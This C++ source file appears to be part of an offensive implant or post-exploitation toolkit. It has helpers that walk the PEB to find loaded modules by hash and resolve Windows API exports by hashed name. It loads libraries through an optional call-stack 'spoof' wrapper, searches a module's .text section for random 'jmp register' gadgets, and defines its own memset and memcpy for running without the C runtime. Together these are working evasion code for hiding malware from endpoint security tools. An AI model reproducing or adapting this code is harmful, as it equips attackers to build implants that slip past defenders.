#include <general.h>

auto declfn mm::copy(
    _In_ PVOID dst,
    _In_ PVOID src,
    _In_ UPTR  size
) -> PVOID {
    return __builtin_memcpy( dst, src, size );
}

auto declfn mm::set(
    _In_ PVOID ptr,
    _In_ UCHAR val,
    _In_ UPTR  size
) -> void {
    return __stosb( (UCHAR*)ptr, (UCHAR)val, size );
}

auto declfn mm::zero(
    _In_ PVOID ptr,
    _In_ UPTR  size
) -> void {
    return __stosb( (UCHAR*)( ptr ), 0, (SIZE_T)size );
}

// extern "C" void* DECLFN memset(void* dest, int val, size_t count) {
//     unsigned char* ptr = (unsigned char*)dest;
//     while (count--) *ptr++ = (unsigned char)val;
//     return dest;
// }

// extern "C" void* DECLFN memcpy(void* dest, const void* src, size_t count) {
//     char* d = (char*)dest;
//     const char* s = (const char*)src;
//     while (count--) *d++ = *s++;
//     return dest;
// }

// extern "C" size_t DECLFN strlen(const char * str) {
//     const char *s = str;
//     while (*s) ++s;
//     return s - str;
// }

// extern "C" size_t DECLFN wcslen(const wchar_t * str) {
//     const wchar_t *s = str;
//     while (*s) ++s;
//     return s - str;
// }

auto declfn load_module(
    _In_ const ULONG libhash
) -> UPTR {
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        if ( ! libhash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }

        if ( hashstr<WCHAR>( Entry->BaseDllName.Buffer ) == libhash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
 
     return 0;
}

auto declfn lid_load( 
    _In_ CHAR* libname
) -> UPTR {
    g_instance

    if ( ! self->postex.spoof ) {
        return (UPTR)self->kernel32.LoadLibraryA( libname );
    }

    return (UPTR)spoof::run( (UPTR)( self->kernel32.LoadLibraryA ), 0, (UPTR)libname );
}
 
auto declfn load_api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR {
    auto FuncPtr    = UPTR { 0 };
    auto NtHdr      = PIMAGE_NT_HEADERS { nullptr };
    auto DosHdr     = PIMAGE_DOS_HEADER { nullptr };
    auto ExpDir     = PIMAGE_EXPORT_DIRECTORY { nullptr };
    auto ExpNames   = PDWORD { nullptr };
    auto ExpAddress = PDWORD { nullptr };
    auto ExpOrds    = PWORD { nullptr };
    auto SymbName   = PSTR { nullptr };

    DosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>( ModBase );
    if ( DosHdr->e_magic != IMAGE_DOS_SIGNATURE ) {
        return 0;
    }

    NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>( ModBase + DosHdr->e_lfanew );
    if ( NtHdr->Signature != IMAGE_NT_SIGNATURE ) {
        return 0;
    }

    ExpDir     = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>( ModBase + NtHdr->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
    ExpNames   = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfNames );
    ExpAddress = reinterpret_cast<PDWORD>( ModBase + ExpDir->AddressOfFunctions );
    ExpOrds    = reinterpret_cast<PWORD> ( ModBase + ExpDir->AddressOfNameOrdinals );

    for ( int i = 0; i < ExpDir->NumberOfNames; i++ ) {
        SymbName = reinterpret_cast<PSTR>( ModBase + ExpNames[ i ] );

        if ( hashstr( SymbName ) != SymbHash ) {
            continue;
        }

        FuncPtr = ModBase + ExpAddress[ ExpOrds[ i ] ];

        break;
    }

    return FuncPtr;
}

auto declfn section_size(
    PVOID libbase,
    UPTR  sechash
) -> ULONG {
    IMAGE_NT_HEADERS*     header = { 0 };
    IMAGE_SECTION_HEADER* sechdr = { 0 };

    header = (IMAGE_NT_HEADERS*)( (UPTR)( libbase ) + ( (PIMAGE_DOS_HEADER)( libbase ) )->e_lfanew );

    if ( header->Signature != IMAGE_NT_SIGNATURE ) return 0;

    sechdr = IMAGE_FIRST_SECTION( header );

    for ( INT i = 0; i < header->FileHeader.NumberOfSections; i++ ) {
        if ( hashstr( sechdr[i].Name ) == sechash ) {
            return sechdr[i].SizeOfRawData;
        }
    }

    return 0;
} 

auto declfn Rnd32( VOID ) -> ULONG {
    g_instance

    ULONG Seed = 0;

    return self->ntdll.RtlRandomEx( &Seed );
}

auto declfn find_jmp_gadget(
    _In_ PVOID  module_base,
    _In_ UINT16 reg_gadget
) -> PVOID {
    PVOID  gadget_ptr    = 0;
    PVOID  gadget_array[10] = { 0 };
    ULONG  gadget_count  = 0;
    ULONG  rnd_index     = 0;
    BYTE*  search_base   = nullptr;
    SIZE_T search_size   = 0;
    UINT16 jump_register = 0xff;

    search_base = ( (BYTE*)module_base + 0x1000 );
    search_size = section_size( module_base, hashstr<CHAR>(".text") );

    for ( INT i = 0; i < search_size - 1; i++ ) {
        if ( search_base[i] == jump_register && search_base[i+1] == reg_gadget ) {
            gadget_array[gadget_count] = (PVOID)( (UPTR)( search_base ) + i ); gadget_count++;
            if ( gadget_count == 10 ) break;
        }
    }

    rnd_index  = Rnd32() % gadget_count;
    gadget_ptr = gadget_array[rnd_index];

    return gadget_ptr;
}

EXTERN_C void* declfn memset(void* ptr, int value, size_t num) {
    mm::set( ptr, value, num);
    return ptr;
}

EXTERN_C void* declfn memcpy(void *__restrict__ _Dst, const void *__restrict__ _Src, size_t _Size) {
    return mm::copy( _Dst, (void*)_Src, _Size );
}